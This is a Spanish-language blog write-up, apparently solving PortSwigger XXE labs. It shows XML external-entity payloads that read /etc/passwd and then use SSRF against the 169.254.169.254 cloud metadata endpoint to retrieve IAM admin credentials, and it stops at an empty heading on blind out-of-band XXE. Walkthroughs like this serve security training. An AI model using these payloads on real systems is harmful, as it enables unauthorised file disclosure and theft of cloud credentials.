---
layout: single
title: XXE - Laboratorios de PortSwigger
excerpt: "En esta segunda parte resolveremos los laboratorios sobre ataques XXE de la plataforma PortSwigger."
date: 2023-03-10
classes: wide
header:
  teaser: /assets/images/LabsXXE/labsxxe.jpg
  teaser_home_page: true
#  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad web
tags:  
  - XXE
  - XML
  - Portswigger
---

<br>

# Laboratorio 1: Explotación de XXE usando entidades externas para recuperar archivos

Vemos las indicaciones del primer laboratorio:

![lab1](/assets/images/LabsXXE/lab1/lab1.png)

Primero nos dice que este laboratorio contiene una función la cual es Comprobar existencias de productos, y nos dice cuantos productos de eso quedan, también dice que se tramita en formato XML.

Nos dice que para completar este laboratorio debemos mostrar el contenido que esta en el archivo /etc/passwd interno de la maquina victima.

<br>

Primero accederemos a el laboratorio y veremos lo siguiente:

![web](/assets/images/LabsXXE/lab1/web.png)

Vemos que nos muestra una web de una tienda, y al abrir algún producto veremos lo siguiente:

![stock](/assets/images/LabsXXE/lab1/stock.png)

Podemos apreciar que debajo del producto al que entramos nos muestra esta función que nos comprueba la existencia de productos disponibles.

Ahora daremos click a "Check stock" pero ahora vamos a interceptar la petición con BurpSuite, y recibimos la siguiente petición:

![xml](/assets/images/LabsXXE/lab1/xml.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			9
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Podemos ver en la petición que se esta tramitando una petición con formato XML para tramitar datos.

<br>

Intentaremos hacer lo que explicamos en el post anterior, inyectaremos nuestra propia entidad genérica para ver si funciona y nos interpreta lo que inyectemos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe "Prueba"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Podemos ver que después de agregar nuestra entidad genérica en el DTD, llamada **xxe** con el valor de **"Prueba"**, y vemos que nos responde lo siguiente:

![xml](/assets/images/LabsXXE/lab1/pruebaEntity.png)

Podemos apreciar que nos responde el mensaje: **"Invalid product ID: Prueba"**, y llamamos a la entidad en las etiquetas de **productId** ya que ahí nos dimos cuenta que se estaban devolviendo valores en pantalla y poder verlos.

<br>

Ahora que sabemos que podemos inyectar entidades entonces inyectaremos una entidad externa para tomar los datos de /etc/passwd, para ello hacemos lo siguiente:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Recordamos que usando el wrapper **"file://"** podemos recuperar datos de un archivo.

Al tramitar la petición veremos lo siguiente:

![xml](/assets/images/LabsXXE/lab1/passwd.png)

Podemos apreciar que nos ha dado el archivo /etc/passwd, y hemos terminado con este primer laboratorio:

![end](/assets/images/LabsXXE/lab1/end.png)

<br>

# Laboratorio 2: Explotación de XXE para realizar ataques SSRF

![xml](/assets/images/LabsXXE/lab2/lab2.png)


En este laboratiro haremos uso del XXE para hacer ataques SSRF, que enseguida veremos que es.

El SSRF(Server-Side Request forgery) es un ataque y lo que hace es por ejemplo, tenemos acceso a un servidor web el cual tiene integrada una función la cual te descarga lo que le pongas en la entrada de esa función, pero en caso de que en la red interna del servidor existan otros equipos conectados a la misma red, podriamos descargas datos importantes de alguna maquina que este en la red del servidor web.

Veamos un ejemplo:

![Diagrama](/assets/images/LabsXXE/lab2/diagrama.png)

Como podemos ver en el ejemplo del diagrama, nuestra maquina atacante tiene conexón con el servidor web, pero no con las maquinas internas de ese servidor web, entonces lo que hace el SSRF es conectarse a el servidor web, y desde el servidor web hacer peticiones maliciosas con el fin de obtener información importante, lo que hacemos es atacar a las maquinas internas desde el servidor web, y de esta forma si tendremos acceso a esas maquinas internas.

Lo que haremos en este nivel será como dice, haremos un SSRF aprovechandonos de un XXE.

Nos dice que del lado del servidor hay un EC2 lo cual en pocas palabras es una especie de servidor en la nube, como estan en la misma red nos dice que debemos recuperar una clave secreta usando una funcion que tiene el servidor web principal, el cual es recuperar metadatos, y esto lo veremos ahora.

También nos dice que la vulnerabilidad XXE se ejecuta desde la función **"check stock"**.

Así que primero iniciaremos el laboratorio en el apartado vulnerable:

![vuln](/assets/images/LabsXXE/lab2/vuln.png)

Daremos en check stock e interceptaremos la petición para ver que nos muestra:

![xml](/assets/images/LabsXXE/lab2/xml.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Podemos ver la siguiente estructura XML, por lo que intentaremos inyectar nuestra entidad en el DTD, y ver si es vulnerable:

![xxe](/assets/images/LabsXXE/lab2/xxe.png)

Podemos apreciar que nos muestra el contenido del servidor, por lo que es vulnerable, así que ahora lo que haremos es el objetivo de este laboratorio, descubrir la clave secreta que esta dentro de un servidor aislado de nuestra maquina atacante pero al cual en teoría podemos acceder haciendo las consultas desde el servidor web, y como ese servidor web esta en la misma red que el servidor aislado, podremos tener conexión.

Vemos que en las instrucciónes del laboratorio nos dice que existe un EC2 que como recordamos es un servidor que esta en la red interna del servidor que intentamos atacar, nos dice que la ip del EC2 es **http://169.254.169.254/**.

Así que un esquema de lo que estamos haciendo ahora sería algo así:

![ec2](/assets/images/LabsXXE/lab2/ec2.png)

Podemos apreciar que tenemos conexión con el servidor web, pero no con la maquina EC2 a la que el servidor web si tiene acceso.

Y en caso de que ese servidor tenga capacidad de **directory listing** podremos ver datos y buscar algo valioso.

<br>

Así que ahora através de la vulnerabilidad XML, llamaremos a la ip del servidor EC2, y como la petición la interpretará el servidor web y ese servidor web tiene acceso a el EC2, entonces nos podrá listar algo en caso de estar habilitado un **directory listing**.

Nuestra consulta se verá así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Y vemos que al tramitar la petición nos responde lo siguiente:

![latest](/assets/images/LabsXXE/lab2/latest.png)

Podemos apreciar que nos ha listado una ruta llamada **latest** en el mensaje de respuesta, así que agregaremos ese valor a la url de la entidad y veremos que queda así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Y ahora veremos la respuesta:

![metadata](/assets/images/LabsXXE/lab2/metadata.png)

Ahora nos listo otra ruta llamada **meta-data**, por lo cual la pondremos en la url y seguir aver que más encontramos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Y vemos la respuesta:

![iam](/assets/images/LabsXXE/lab2/iam.png)

Ahora vemos otra ruta llamada iam, la cual al entrar nuevamente agregandola a la url:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Veremos lo siguiente:

![credentials](/assets/images/LabsXXE/lab2/credentials.png)

Y al acceder a esta otra ruta que encontramos llamada **security-credentials** veremos lo siguiente:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Ahora vemos que dentro de esta ruta encontramos esto:

![admin](/assets/images/LabsXXE/lab2/admin.png)

Encontramos otra ruta o archivo llamado **admin**, al cual al acceder veremos lo siguiente:

![dat](/assets/images/LabsXXE/lab2/dat.png)

Y podemos ver que hemos encontrado las credenciales al parecer del usuario admin.

Y ya habremos terminado con este laboratorio 2.

<br>

# XXE Blind Out-of-band

